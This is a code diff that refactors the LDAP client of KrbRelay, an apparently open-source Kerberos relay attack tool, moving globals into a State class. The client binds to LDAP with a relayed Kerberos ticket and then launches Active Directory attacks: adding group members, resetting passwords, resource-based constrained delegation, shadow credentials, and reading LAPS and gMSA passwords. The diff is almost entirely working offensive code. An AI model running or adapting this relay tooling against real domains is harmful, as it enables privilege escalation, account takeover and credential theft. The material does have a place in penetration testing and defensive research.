@@ -1,8 +1,6 @@
 ﻿using System;
 using System.Linq;
 using System.Runtime.InteropServices;
-using static KrbRelay.Natives;
-using static KrbRelay.Program;
 
 namespace KrbRelay.Clients
 {
@@ -10,70 +8,72 @@ namespace KrbRelay.Clients
     {
         public static void Connect()
         {
-            //create berval struct with the kerberos ticket
-            var sTicket = new SecBuffer(ticket);
-            var berval = new berval
-            {
-                bv_len = sTicket.cbBuffer,
-                bv_val = sTicket.pvBuffer
-            };
+            // create berval struct with the kerberos ticket
+
+            var buffer = new SecurityBuffer(State.ticket);
+            var berval = new berval { bv_len = buffer.Count, bv_val = buffer.Token };
+
             var bervalPtr = Marshal.AllocHGlobal(Marshal.SizeOf(berval));
             Marshal.StructureToPtr(berval, bervalPtr, false);
-            var bind = ldap_sasl_bind(
-                ld,
+
+            var bind = Interop.ldap_sasl_bind(
+                State.ld,
                 "",
                 "GSS-SPNEGO", // GSS-SPNEGO / GSSAPI
                 bervalPtr,
                 IntPtr.Zero,
                 IntPtr.Zero,
-                out IntPtr servresp);
+                out IntPtr servresp
+            );
+
             Console.WriteLine("[*] bind: {0}", bind);
-            ldap_get_option(ld, 0x0031, out int value);
+
+            Interop.ldap_get_option(State.ld, 0x0031, out int value);
             Console.WriteLine("[*] ldap_get_option: {0}", (LdapStatus)value);
 
-            if ((LdapStatus)value == LdapStatus.LDAP_SUCCESS)
+            if ((LdapStatus)value == LdapStatus.Success)
             {
                 Console.WriteLine("[+] LDAP session established");
 
                 try
                 {
-                    if (attacks.Keys.Contains("console"))
+                    if (State.attacks.Keys.Contains("console"))
                     {
-                        ldapConsole(ld, attacks["console"]);
+                        ldapConsole(State.ld, State.attacks["console"]);
                     }
-                    if (attacks.Keys.Contains("add-groupmember"))
+                    if (State.attacks.Keys.Contains("add-groupmember"))
                     {
-                        string arg1 = attacks["add-groupmember"].Split(new[] { ' ' }, 2)[0];
-                        string arg2 = attacks["add-groupmember"].Split(new[] { ' ' }, 2)[1];
-                        Attacks.Ldap.addGroupMember.attack(ld, arg1, arg2);
+                        string arg1 = State.attacks["add-groupmember"].Split(new[] { ' ' }, 2)[0];
+                        string arg2 = State.attacks["add-groupmember"].Split(new[] { ' ' }, 2)[1];
+                        Attacks.Ldap.AddGroupMember.attack(State.ld, arg1, arg2);
                     }
-                    if (attacks.Keys.Contains("reset-password"))
+                    if (State.attacks.Keys.Contains("reset-password"))
                     {
-                        string arg1 = attacks["reset-password"].Split(new[] { ' ' }, 2)[0];
-                        string arg2 = attacks["reset-password"].Split(new[] { ' ' }, 2)[1];
-                        Attacks.Ldap.setPassword.attack(ld, arg1, arg2);
+                        string arg1 = State.attacks["reset-password"].Split(new[] { ' ' }, 2)[0];
+                        string arg2 = State.attacks["reset-password"].Split(new[] { ' ' }, 2)[1];
+                        Attacks.Ldap.setPassword.attack(State.ld, arg1, arg2);
                     }
-                    if (attacks.Keys.Contains("rbcd"))
+                    if (State.attacks.Keys.Contains("rbcd"))
                     {
-                        string arg1 = attacks["rbcd"].Split(new[] { ' ' }, 2)[0];
-                        string arg2 = attacks["rbcd"].Split(new[] { ' ' }, 2)[1];
-                        Attacks.Ldap.RBCD.attack(ld, arg1, arg2);
+                        string arg1 = State.attacks["rbcd"].Split(new[] { ' ' }, 2)[0];
+                        string arg2 = State.attacks["rbcd"].Split(new[] { ' ' }, 2)[1];
+                        Attacks.Ldap.RBCD.attack(State.ld, arg1, arg2);
                     }
-                    if (attacks.Keys.Contains("shadowcred"))
+                    if (State.attacks.Keys.Contains("shadowcred"))
                     {
-                        string arg1 = relayedUser;
-                        if (!string.IsNullOrEmpty(attacks["shadowcred"]))
-                            arg1 = attacks["shadowcred"];
+                        string arg1 = State.relayedUser;
+                        if (!string.IsNullOrEmpty(State.attacks["shadowcred"]))
+                            arg1 = State.attacks["shadowcred"];
 
-                        Attacks.Ldap.ShadowCredential.attack(ld, arg1);
+                        Attacks.Ldap.ShadowCredential.attack(State.ld, arg1);
                     }
-                    if (attacks.Keys.Contains("laps"))
+                    if (State.attacks.Keys.Contains("laps"))
                     {
-                        Attacks.Ldap.LAPS.read(ld, attacks["laps"]);
+                        Attacks.Ldap.LAPS.read(State.ld, State.attacks["laps"]);
                     }
-                    if (attacks.Keys.Contains("gmsa"))
+                    if (State.attacks.Keys.Contains("gmsa"))
                     {
-                        Attacks.Ldap.gMSA.read(ld, attacks["gmsa"]);
+                        Attacks.Ldap.gMSA.read(State.ld, State.attacks["gmsa"]);
                     }
                 }
                 catch (Exception e)
@@ -81,13 +81,11 @@ namespace KrbRelay.Clients
                     Console.WriteLine("[-] {0}", e);
                 }
 
-                ldap_unbind(ld);
-                Environment.Exit(0);
+                Interop.ldap_unbind(State.ld);
             }
-            if ((LdapStatus)value != LdapStatus.LDAP_SASL_BIND_IN_PROGRESS)
+            if ((LdapStatus)value != LdapStatus.SaslBindInProgress)
             {
                 Console.WriteLine("[-] Ldap failed");
-                Environment.Exit(0);
             }
             else
             {
@@ -95,8 +93,7 @@ namespace KrbRelay.Clients
                 berval msgidp2 = (berval)Marshal.PtrToStructure(servresp, typeof(berval));
                 byte[] msgidbytes = new byte[msgidp2.bv_len];
                 Marshal.Copy(msgidp2.bv_val, msgidbytes, 0, msgidp2.bv_len);
-                apRep1 = msgidbytes;
-                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
+                State.UpdateApRep1(msgidbytes);
             }
         }
 
@@ -142,7 +139,7 @@ namespace KrbRelay.Clients
 
                         case "rm-acl":
                             break;
-                        
+
                         case "shadowcred":
                             if (string.IsNullOrEmpty(arg1))
                             {
